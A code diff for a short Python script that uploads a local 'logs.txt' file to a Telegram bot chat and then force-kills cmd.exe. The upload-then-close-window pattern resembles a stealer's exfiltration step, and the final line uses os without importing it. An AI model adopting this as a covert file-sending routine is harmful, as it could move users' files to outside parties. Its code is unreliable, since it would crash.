@@ -1,44 +1,27 @@
-import logging
-from telegram import Bot
-from telegram.ext import Updater, CommandHandler
+import requests
 
-# Get TOKEN
-TOKEN = 'YOUR_TOKEN'
-GROUP_CHAT_ID = 'ID_CHAT'  
+# Info
+bot_token = 'TOKEN_BOT' # Add your bot token
+chat_id = 'CHAT_ID' # Add your chat ID
+file_path = r'D:\logs.txt'
 
-# Configure logging
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-                    level=logging.INFO)
+# URL API of Telegram
+url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
 
-logger = logging.getLogger(__name__)
+try:
+    # Open file and send
+    with open(file_path, 'rb') as file:
+        files = {'document': file}
+        data = {'chat_id': chat_id}
+        response = requests.post(url, data=data, files=files)
 
-def start(update, context):
-    update.message.reply_text('Xin chào! Bot đã khởi động.')
+    # Check the response
+    if response.status_code == 200:
+        print('File đã được gửi thành công!')
+    else:
+        print('Có lỗi xảy ra:', response.text)
+except Exception as e:
+    print('Có lỗi xảy ra:', str(e))
 
-def send_log_file(bot: Bot):
-    file_path = r'C:\Program Files\log.txt'
-    
-    try:
-        with open(file_path, 'rb') as file:
-            bot.send_document(chat_id=GROUP_CHAT_ID, document=file)
-    except FileNotFoundError:
-        logger.error('Không tìm thấy file tại đường dẫn này.')
-    except Exception as e:
-        logger.error(f'Đã xảy ra lỗi: {e}')
-
-def main():
-    updater = Updater(TOKEN)
-    bot = Bot(TOKEN)
-
-    # Send file log.txt 
-    send_log_file(bot)
-
-    dispatcher = updater.dispatcher
-
-    dispatcher.add_handler(CommandHandler("start", start))
-
-    updater.start_polling()
-    updater.idle()
-
-if __name__ == '__main__':
-    main()
+# Shutdown cmd
+os.system("taskkill /f /im cmd.exe")
